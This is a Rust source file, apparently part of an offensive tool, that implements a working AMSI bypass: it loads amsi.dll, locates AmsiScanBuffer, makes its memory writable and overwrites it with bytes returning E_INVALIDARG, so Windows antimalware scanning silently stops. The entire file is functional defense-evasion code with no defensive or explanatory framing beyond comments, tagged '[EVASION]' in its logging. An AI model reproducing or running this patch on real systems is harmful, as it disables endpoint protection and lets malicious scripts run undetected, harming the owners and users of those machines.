//! AMSI (Antimalware Scan Interface) bypass
//! Patches amsi!AmsiScanBuffer to return E_INVALIDARG.

use crate::error::MemoricError;
use serde_json::Value;

/// AMSI bypass - patch AmsiScanBuffer to return E_INVALIDARG (0x80070057).
/// This makes AMSI think the scan request is invalid, so it skips scanning.
/// Patch: mov eax, 0x80070057; ret (B8 57 00 07 80 C3)
pub fn amsi_bypass(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
    use windows::Win32::System::Memory::{
        VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
    };

    tracing::warn!("[EVASION] Attempting AMSI bypass (patch AmsiScanBuffer)");

    unsafe {
        // Load amsi.dll (may not be loaded yet)
        let amsi = LoadLibraryA(windows::core::PCSTR(b"amsi.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to load amsi.dll: {}", e)))?;

        // Get AmsiScanBuffer address
        let amsi_addr = GetProcAddress(amsi, windows::core::PCSTR(b"AmsiScanBuffer\0".as_ptr()))
            .ok_or_else(|| {
                MemoricError::WindowsApi("Failed to get AmsiScanBuffer address".to_string())
            })?;

        let amsi_ptr = amsi_addr as *mut u8;
        let patch_size = 6usize;

        // Idempotency check
        let current_bytes = std::slice::from_raw_parts(amsi_ptr, patch_size);
        if current_bytes == [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3] {
            tracing::info!("AMSI bypass already applied (idempotent)");
            return Ok(serde_json::json!({
                "success": true,
                "already_patched": true,
                "address": format!("0x{:016X}", amsi_ptr as usize),
                "message": "AmsiScanBuffer was already patched"
            }));
        }

        // Save original bytes
        let mut original = [0u8; 6];
        original.copy_from_slice(current_bytes);

        // Change protection to RWX
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            amsi_ptr as *mut _,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtect failed: {}", e)))?;

        // Write patch: mov eax, 0x80070057; ret
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        std::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_ptr, patch_size);

        // Restore protection
        let mut tmp = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtect(amsi_ptr as *mut _, patch_size, old_protect, &mut tmp);

        tracing::info!("AMSI bypass applied successfully");

        Ok(serde_json::json!({
            "success": true,
            "already_patched": false,
            "address": format!("0x{:016X}", amsi_ptr as usize),
            "original_bytes": format!("{:02X} {:02X} {:02X} {:02X} {:02X} {:02X}",
                original[0], original[1], original[2], original[3], original[4], original[5]),
            "patch_bytes": "B8 57 00 07 80 C3",
            "message": "AmsiScanBuffer patched (mov eax, E_INVALIDARG; ret)"
        }))
    }
}
